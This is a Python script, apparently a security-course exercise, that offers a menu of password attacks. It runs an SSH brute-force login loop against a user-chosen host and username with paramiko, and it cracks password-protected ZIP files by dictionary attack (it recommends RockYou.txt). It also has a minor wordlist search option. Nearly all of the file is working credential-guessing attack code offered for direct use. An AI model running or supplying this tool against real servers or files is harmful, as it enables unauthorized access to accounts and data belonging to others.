import time
import paramiko
import zipfile

def read_wordlist(file_path):
    try:
        with open(file_path, 'r', encoding='latin-1') as file:
            return file.readlines()
    except FileNotFoundError:
        print("File not found. Please check the file path.")
        return None

def dictionary_iterator(words):
    for word in words:
        word = word.strip()
        print(word)
        time.sleep(0.5)  # Delay of 0.5 seconds between words

def password_recognized(search_string, words):
    if search_string in words:
        print(f"'{search_string}' appeared in the word list.")
    else:
        print(f"'{search_string}' did not appear in the word list.")

def ssh_brute_force(host, username, words):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in words:
        password = password.strip()
        try:
            ssh.connect(host, username=username, password=password)
            print(f"Successful SSH login - Username: {username}, Password: {password}")
            break  # Exit the loop if a successful login is found
        except paramiko.AuthenticationException:
            print(f"Failed SSH login attempt - Username: {username}, Password: {password}")
        except paramiko.SSHException:
            print(f"SSH error occurred - Username: {username}, Password: {password}")
        except Exception as e:
            print(f"An error occurred - Username: {username}, Password: {password}: {str(e)}")

    ssh.close()

def zip_brute_force(zip_file_path, words):
    with zipfile.ZipFile(zip_file_path, 'r') as zip_file:
        for password in words:
            password = password.strip()
            try:
                zip_file.extractall(pwd=password.encode())
                print(f"Password cracked: {password}")
                break  # Exit the loop if the password is cracked
            except Exception:
                pass

def main():
    while True:
        print("\nMenu:")
        print("1: Original Functionality (Word List Operations)")
        print("2: SSH Brute Force")
        print("3: ZIP File Brute Force")
        print("4: Exit")
        
        choice = input("Select an option: ")

        if choice == '1':
            mode = input("Select mode (1: Offensive, 2: Defensive): ")
            file_path = input("Enter the word list file path: ")

            words = read_wordlist(file_path)
            if words is not None:
                if mode == '1':
                    dictionary_iterator(words)
                elif mode == '2':
                    search_string = input("Enter the string to search: ")
                    password_recognized(search_string, ''.join(words))
                else:
                    print("Invalid mode selected.")

        elif choice == '2':
            host = input("Enter the SSH server's IP address: ")
            username = input("Enter the username to brute force: ")
            file_path = input("Enter the word list file path: ")

            words = read_wordlist(file_path)
            if words is not None:
                ssh_brute_force(host, username, words)

        elif choice == '3':
            zip_file_path = input("Enter the path to the password-protected ZIP file: ")
            file_path = input("Enter the word list file path (RockYou.txt recommended): ")

            words = read_wordlist(file_path)
            if words is not None:
                zip_brute_force(zip_file_path, words)

        elif choice == '4':
            print("Exiting program.")
            break

        else:
            print("Invalid choice. Please select a valid option.")

if __name__ == "__main__":
    main()
